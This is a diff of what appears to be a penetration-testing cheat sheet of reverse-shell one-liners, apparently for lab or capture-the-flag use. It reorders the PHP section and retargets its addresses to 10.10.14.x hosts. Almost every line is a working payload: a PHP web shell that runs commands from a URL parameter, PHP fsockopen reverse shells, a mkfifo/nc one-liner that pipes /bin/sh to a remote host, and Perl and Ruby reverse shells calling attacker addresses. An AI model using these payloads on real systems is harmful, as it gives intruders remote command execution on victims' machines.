@@ -41,6 +41,15 @@
     <?php echo "Shell";system($_GET['cmd']); ?>
 
 
+# php
+    This code assumes that the TCP connection uses file descriptor 3.  If it doesn’t work, try 4, 5, 6…
+    php -r '$sock=fsockopen("10.10.14.36",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+    <?php $sock=fsockopen("10.10.14.36",4444);exec("/bin/sh -i <&3 >&3 2>&3"); ?>
+    [exploit/php_reverse_shell/php-reverse-shell.php](exploit/php_reverse_shell/php-reverse-shell.php)
+
+    <?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.32 4444 >/tmp/f");?>
+
 # Python
 
     - Collection of python TCP/UDP/PTY shells: https://github.com/infodox/python-pty-shells
@@ -77,12 +86,6 @@
 # Perl windows
     perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 
-
-# php
-    This code assumes that the TCP connection uses file descriptor 3.  If it doesn’t work, try 4, 5, 6…
-    php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
-
-    [exploit/php_reverse_shell/php-reverse-shell.php](exploit/php_reverse_shell/php-reverse-shell.php)
 
 # Ruby
     ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
